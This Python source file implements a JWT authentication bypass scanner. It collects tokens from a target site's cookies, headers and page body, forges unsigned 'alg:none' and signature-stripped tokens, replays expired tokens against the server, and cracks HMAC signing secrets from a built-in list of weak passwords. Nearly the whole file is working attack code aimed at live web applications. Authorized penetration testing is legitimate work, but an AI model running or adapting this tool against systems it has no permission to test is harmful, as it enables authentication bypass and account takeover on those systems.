import requests
import base64
import json
import hashlib
import hmac
import re
from colorama import Fore


class JWTScanner:
    """JWT Authentication Bypass Scanner."""
    def __init__(self):
        self.weak_secrets = [
            "secret", "password", "123456", "key", "jwt_secret",
            "changeme", "admin", "test", "default", "supersecret",
            "mysecret", "s3cr3t", "jwt", "token", "auth",
            "your-256-bit-secret", "your-secret-key", "qwerty",
            "letmein", "P@ssw0rd", "abc123", "1234567890",
            "access_token_secret", "secretkey", "private",
        ]
        self.jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    def scan(self, target_url):
        print(f"{Fore.CYAN}[*] Checking for JWT vulnerabilities on {target_url}...")
        findings = []
        try:
            session = requests.Session()
            res = session.get(target_url, timeout=10)
            jwts_found = self._extract_jwts(res)
            if not jwts_found:
                return findings
            print(f"{Fore.GREEN}[+] Found {len(jwts_found)} JWT token(s). Testing...")
            for jwt_token, source in jwts_found:
                for test in [self._test_alg_none, self._test_no_signature, self._test_expired_token]:
                    result = test(jwt_token, target_url, source, session)
                    if result:
                        findings.append(result)
                weak = self._test_weak_secret(jwt_token)
                if weak:
                    findings.append(weak)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] JWT scan error: {e}")
        return findings

    def _extract_jwts(self, response):
        jwts = []
        for cn, cv in response.cookies.items():
            for m in self.jwt_pattern.findall(cv):
                jwts.append((m, f"cookie:{cn}"))
        for h in ['Authorization', 'X-Auth-Token', 'X-Access-Token', 'Token']:
            if h in response.headers:
                for m in self.jwt_pattern.findall(response.headers[h]):
                    jwts.append((m, f"header:{h}"))
        for m in self.jwt_pattern.findall(response.text):
            jwts.append((m, "body"))
        return jwts

    def _b64url_decode(self, part):
        part += "=" * (4 - len(part) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(part))
        except Exception:
            return None

    def _b64url_encode(self, data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).rstrip(b'=').decode()

    def _test_alg_none(self, token, target_url, source, session):
        parts = token.split('.')
        if len(parts) != 3: return None
        header = self._b64url_decode(parts[0])
        payload = self._b64url_decode(parts[1])
        if not header or not payload: return None
        for alg in ["none", "None", "NONE", "nOnE"]:
            new_h = header.copy()
            new_h['alg'] = alg
            forged = f"{self._b64url_encode(new_h)}.{self._b64url_encode(payload)}."
            if self._try_forged(forged, target_url, source, session):
                print(f"{Fore.RED}[!!!] JWT alg:none bypass SUCCESSFUL!")
                return {"type": "JWT Algorithm None Bypass", "cwe": "CWE-345",
                        "details": f"Server accepts unsigned JWT (alg:{alg}). Source: {source}",
                        "url": target_url, "payload": forged[:80] + "..."}
        return None

    def _test_weak_secret(self, token):
        parts = token.split('.')
        if len(parts) != 3: return None
        header = self._b64url_decode(parts[0])
        if not header or header.get('alg') not in ['HS256', 'HS384', 'HS512']: return None
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        sig_padded = parts[2] + '=' * (4 - len(parts[2]) % 4)
        try:
            expected = base64.urlsafe_b64decode(sig_padded)
        except Exception:
            return None
        alg_map = {'HS256': 'sha256', 'HS384': 'sha384', 'HS512': 'sha512'}
        h_alg = alg_map[header['alg']]
        for secret in self.weak_secrets:
            computed = hmac.new(secret.encode(), signing_input, h_alg).digest()
            if computed == expected:
                print(f"{Fore.RED}[!!!] JWT Weak Secret Found: '{secret}'")
                return {"type": "JWT Weak HMAC Secret", "cwe": "CWE-798",
                        "details": f"JWT signed with weak secret: '{secret}' ({header['alg']})",
                        "url": "N/A", "payload": f"Secret: {secret}"}
        return None

    def _test_no_signature(self, token, target_url, source, session):
        parts = token.split('.')
        if len(parts) != 3: return None
        stripped = f"{parts[0]}.{parts[1]}."
        if self._try_forged(stripped, target_url, source, session):
            print(f"{Fore.RED}[!!!] JWT Missing Signature Validation!")
            return {"type": "JWT Missing Signature Validation", "cwe": "CWE-347",
                    "details": f"Server accepts JWT with empty signature. Source: {source}",
                    "url": target_url, "payload": stripped[:80] + "..."}
        return None

    def _test_expired_token(self, token, target_url, source, session):
        parts = token.split('.')
        if len(parts) != 3: return None
        payload = self._b64url_decode(parts[1])
        if not payload or 'exp' not in payload: return None
        import time
        now = int(time.time())
        if payload['exp'] < now:
            if self._try_forged(token, target_url, source, session):
                print(f"{Fore.RED}[!!!] Server accepts EXPIRED JWT!")
                return {"type": "JWT Expired Token Accepted", "cwe": "CWE-613",
                        "details": f"Expired JWT accepted (exp={payload['exp']}, now={now}). Source: {source}",
                        "url": target_url, "payload": token[:80] + "..."}
        return None

    def _try_forged(self, token, target_url, source, session):
        try:
            headers, cookies = {}, {}
            if source.startswith("cookie:"):
                cookies[source.split(":", 1)[1]] = token
            else:
                headers['Authorization'] = f"Bearer {token}"
            res = session.get(target_url, headers=headers, cookies=cookies, timeout=5)
            if res.status_code == 200:
                body = res.text.lower()
                if not any(e in body for e in ["invalid", "expired", "unauthorized", "denied"]):
                    return True
        except Exception:
            pass
        return False
